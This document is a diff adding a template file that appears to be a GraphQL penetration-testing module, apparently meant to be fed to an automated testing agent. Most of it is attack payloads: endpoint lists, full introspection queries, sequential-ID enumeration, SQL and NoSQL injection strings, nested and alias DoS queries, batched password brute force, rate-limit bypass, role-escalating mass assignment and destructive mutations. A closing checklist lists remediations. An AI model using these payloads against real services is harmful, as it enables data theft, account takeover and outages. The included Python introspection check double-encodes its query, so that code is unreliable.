@@ -1,0 +1,305 @@
+{# GraphQL Security Testing Module #}
+{# Comprehensive GraphQL vulnerability discovery and exploitation #}
+
+<graphql_security_module>
+
+## GRAPHQL SECURITY TESTING GUIDE
+
+### RECONNAISSANCE & DISCOVERY
+
+**Endpoint Detection:**
+```
+Common GraphQL Endpoints:
+/graphql
+/graphql/console
+/graphql/api
+/graphiql
+/graphql/graphiql
+/graphql.php
+/graphql/v1
+/api/graphql
+/v1/graphql
+/v2/graphql
+/query
+/gql
+/graphql/schema.json
+/graphql/schema.xml
+```
+
+**Fingerprinting Techniques:**
+- Send POST with `{"query": "{__typename}"}` - returns "Query" if GraphQL
+- Check response headers for GraphQL-specific headers
+- Look for GraphQL error messages in responses
+- Test with malformed queries to trigger error messages
+
+### INTROSPECTION ATTACKS
+
+**Full Schema Introspection Query:**
+```graphql
+{
+  __schema {
+    queryType { name }
+    mutationType { name }
+    subscriptionType { name }
+    types {
+      ...FullType
+    }
+    directives {
+      name
+      description
+      locations
+      args { ...InputValue }
+    }
+  }
+}
+
+fragment FullType on __Type {
+  kind
+  name
+  description
+  fields(includeDeprecated: true) {
+    name
+    description
+    args { ...InputValue }
+    type { ...TypeRef }
+    isDeprecated
+    deprecationReason
+  }
+  inputFields { ...InputValue }
+  interfaces { ...TypeRef }
+  enumValues(includeDeprecated: true) {
+    name
+    description
+    isDeprecated
+    deprecationReason
+  }
+  possibleTypes { ...TypeRef }
+}
+
+fragment InputValue on __InputValue {
+  name
+  description
+  type { ...TypeRef }
+  defaultValue
+}
+
+fragment TypeRef on __Type {
+  kind
+  name
+  ofType {
+    kind
+    name
+    ofType {
+      kind
+      name
+      ofType {
+        kind
+        name
+      }
+    }
+  }
+}
+```
+
+**Quick Introspection Check:**
+```graphql
+{__schema{types{name,fields{name}}}}
+```
+
+### IDOR & AUTHORIZATION BYPASS
+
+**Object ID Enumeration:**
+```graphql
+# Test sequential IDs
+query { user(id: 1) { id email role } }
+query { user(id: 2) { id email role } }
+
+# Test with different ID formats
+query { user(id: "1") { ... } }
+query { user(id: "uuid-here") { ... } }
+query { order(orderId: "1001") { total customerEmail } }
+```
+
+**Field-Level Authorization:**
+```graphql
+# Request sensitive fields
+query {
+  users {
+    id
+    email
+    password
+    ssn
+    creditCard
+    role
+    permissions
+    internalNotes
+  }
+}
+```
+
+### INJECTION ATTACKS
+
+**SQL Injection via GraphQL:**
+```graphql
+query { 
+  user(name: "admin' OR '1'='1") { id email }
+}
+
+query {
+  search(query: "test' UNION SELECT password FROM users--") { results }
+}
+
+mutation {
+  login(username: "admin'--", password: "x") { token }
+}
+```
+
+**NoSQL Injection:**
+```graphql
+query {
+  user(filter: "{\"$gt\": \"\"}") { id email }
+}
+
+mutation {
+  login(username: {"$ne": null}, password: {"$ne": null}) { token }
+}
+```
+
+### DENIAL OF SERVICE (DoS)
+
+**Deeply Nested Queries:**
+```graphql
+query {
+  user(id: 1) {
+    friends {
+      friends {
+        friends {
+          friends {
+            friends {
+              id name
+            }
+          }
+        }
+      }
+    }
+  }
+}
+```
+
+**Alias-based DoS:**
+```graphql
+query {
+  a1: user(id: 1) { id }
+  a2: user(id: 1) { id }
+  a3: user(id: 1) { id }
+  # Repeat 1000+ times
+}
+```
+
+**Circular Fragment DoS:**
+```graphql
+fragment A on User { ...B }
+fragment B on User { ...A }
+query { user { ...A } }
+```
+
+### BATCHING ATTACKS
+
+**Query Batching for Brute Force:**
+```json
+[
+  {"query": "mutation{login(u:\"admin\",p:\"pass1\"){token}}"},
+  {"query": "mutation{login(u:\"admin\",p:\"pass2\"){token}}"},
+  {"query": "mutation{login(u:\"admin\",p:\"pass3\"){token}}"}
+]
+```
+
+**Batching for Rate Limit Bypass:**
+```json
+[
+  {"query": "query{user(id:1){email}}"},
+  {"query": "query{user(id:2){email}}"},
+  {"query": "query{user(id:3){email}}"}
+]
+```
+
+### INFORMATION DISCLOSURE
+
+**Error-based Information Leakage:**
+```graphql
+# Trigger verbose errors
+query { user(id: "invalid") { id } }
+query { nonExistentField }
+query { user { __private } }
+
+# Stack trace extraction
+mutation { createUser(input: null) { id } }
+```
+
+**Field Suggestions Exploitation:**
+```graphql
+# Typos to get field suggestions
+query { user { pasword } }  # May suggest "password"
+query { user { emil } }     # May suggest "email"
+```
+
+### MUTATION ABUSE
+
+**Mass Assignment:**
+```graphql
+mutation {
+  updateUser(id: 1, input: {
+    role: "admin"
+    isVerified: true
+    permissions: ["ALL"]
+  }) { id role }
+}
+```
+
+**Dangerous Mutations:**
+```graphql
+mutation { deleteAllUsers { count } }
+mutation { resetDatabase { success } }
+mutation { exportData { url } }
+```
+
+### TOOLS & AUTOMATION
+
+**Recommended Tools:**
+- graphql-voyager - Schema visualization
+- InQL - Burp Suite extension
+- graphql-cop - Security scanner
+- BatchQL - Batch query testing
+- clairvoyance - Schema extraction without introspection
+
+**Automation Script Pattern:**
+```python
+import requests
+
+def test_introspection(url):
+    query = '{"query":"{__schema{types{name}}}"}'
+    r = requests.post(url, json={"query": query})
+    if "__schema" in r.text:
+        return "INTROSPECTION ENABLED - CRITICAL"
+    return "Introspection disabled"
+
+def test_batching(url):
+    batch = [{"query": "{__typename}"} for _ in range(100)]
+    r = requests.post(url, json=batch)
+    if r.status_code == 200:
+        return "BATCHING ENABLED - Test for DoS/Brute Force"
+    return "Batching may be disabled"
+```
+
+### REMEDIATION CHECKLIST
+
+- [ ] Disable introspection in production
+- [ ] Implement query depth limiting
+- [ ] Add query complexity analysis
+- [ ] Use persisted queries
+- [ ] Implement proper authorization on all resolvers
+- [ ] Rate limit by query complexity, not just requests
+- [ ] Sanitize all inputs in resolvers
+- [ ] Disable field suggestions in production
+
+</graphql_security_module>
